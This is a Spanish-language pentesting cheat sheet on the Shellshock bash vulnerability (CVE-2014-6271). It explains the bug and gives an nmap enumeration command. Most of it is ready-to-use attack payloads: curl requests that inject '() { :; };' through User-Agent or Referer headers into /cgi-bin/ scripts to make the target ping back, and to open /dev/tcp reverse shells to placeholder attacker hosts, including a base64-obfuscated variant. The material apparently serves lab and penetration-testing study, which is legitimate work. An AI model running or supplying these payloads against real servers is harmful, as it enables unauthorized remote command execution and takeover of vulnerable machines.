# SHELLSHOCK

- [[#INTRODUCCION|INTRODUCCION]]
- [[#EXPLICACION|EXPLICACION]]
- [[#POC|POC]]
- [[#ENUMERACION CON NMAP|ENUMERACION CON NMAP]]
- [[#ATAQUE|ATAQUE]]
	- [[#POC WEB|POC WEB]]
	- [[#REVERSE SHELL|REVERSE SHELL]]


## INTRODUCCION

Esta es una vulnerabilidad que sólo se ve en Linux, pues en Windows no afecta. La vulnerabilidad lo que nos permite es, tras no validar de forma correcta la declaración de funciones en variables, ejecutar comandos en remoto sobre sistemas a través de consultas en este caso por medio de peticiones web.

Shellshock es una vulnerabilidad asociada al CVE-2014-6271 que salió el 24 de septiembre de 2014 y afecta a la shell de Linux “Bash” hasta la versión 4.3. Esta vulnerabilidad permite una ejecución arbitraria de comandos.

Puede **encontrar** esta vulnerabilidad si nota que está usando una **versión antigua de Apache** y **cgi_mod**.

cuando se ve un archivo de tipo **.cgi** o la ruta en la url **/cgi-bin/** se puede probar el ataque shellshock, esto si la shell es vulnerable. Hay veces que la extension no es necesario que sea **.cgi**, sino **.sh** u otro, pero debe estar en la ruta **/cgi-bin/**.

Estos archivos interactuan con una bash y si es una bash vulnerable es posible ejecutar comandos arbitrarios.

## EXPLICACION

La vulnerabilidad esta en la inyeccion de comandos en variables de entorno, sabemos podemos definir una variable de entorno de la siguiente manera:

```bash
export SALUDO="hola mundo"

echo $SALUDO #hola mundo
```

tambien es posible almacenar dentro de una variable de entorno una funcion escrita en bash que tiene la siguiente sintaxis:

```bash

nombre_funcion(){contenido}

#EJEMPLO

export saludo="(){echo \"hola mundo\"}"

bash -c 'saludo' #hola mundo
```

En este ejemplo no es necesario colocar un nombre de funcion y estamos escapando las comillas dobles. Dentro de una variable de entorno declarada como si tuviera una funcion se puede ejecutar comandos del sistema, en este caso hicimos un simple echo dentro de la funcion.

## POC

Sabemos que con **;** se puede concatenar comandos, que pasa si colocamos lo siguiente:

```bash
export saludo="(){:;}; whoami"
```

Pues si la bash es vulnerable es posible realizar la ejecucion de comandos, ya que despues de una funcion que no hace nada se esta concatenando otro comando mendiante el **;**.

A veces es necesario colocar 1 o 2 **echo;** despues de la funcion o antes del comando.

## ENUMERACION CON NMAP

```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```

## ATAQUE

Los archivos susceptibles a un ataque Shellshock son los que comúnmente pertenezcan a alguna de las siguientes extensiones:

- cgi
- bin
- sh
- pl

Ahora a nivel web esto se puede colocar en una cabecera, por ejemplo el **User-Agent** o **referer** ya que en el servidor web estas cabeceras las reconoce como variables de entorno.

### POC WEB

podemos comprobar si podemos ejecutar comandos enviando un ping desde la maquina victima a nuestra maquina kali:

nos colocamos a la escuhca para recibir paquetes ICMP:

```bash
tcpdump -i tun0 icmp -n
```

```bash
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -c 'ping -c 4 <IP_KALI>'" "https://192.168.1.X:10000/cgi-bin/recurso.cgi"
```

```bash
curl --silent -k -H "Referer: () { :; }; /bin/bash -c 'ping -c 4 <IP_KALI>'" "https://192.168.1.X:10000/cgi-bin/recurso.cgi"
```

### REVERSE SHELL

```bash
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ipLocal/puertoLocal 0>&1" "https://192.168.1.X:10000/cgi-bin/recurso.cgi"
```

```bash
curl --silent -k -H "Referer: () { :; }; /bin/bash -i >& /dev/tcp/ipLocal/puertoLocal 0>&1" "https://192.168.1.X:10000/cgi-bin/recurso.cgi"
```

podemos enviar en base 64:

```bash
echo '/bin/bash -i >& /dev/tcp/ipLocal/puertoLocal 0>&1' | base64
```

```bash
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -c 'echo \"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwL2lwTG9jYWwvcHVlcnRvTG9jYWwgMD4mMQo=\" | base64 -d | /bin/bash '" "https://192.168.1.X:10000/cgi-bin/recurso.cgi"
```

```bash
curl --silent -k -H "Referer: () { :; }; /bin/bash -c 'echo \"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwL2lwTG9jYWwvcHVlcnRvTG9jYWwgMD4mMQo=\" | base64 -d | /bin/bash '" "https://192.168.1.X:10000/cgi-bin/recurso.cgi"
```

Desde burpsuite podemos modificar el User-agent tambien:

```bash
User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/ip/puerto 0>&1
```

Repositorio util:

[shellshocker](https://github.com/erinzm/shellshocker)

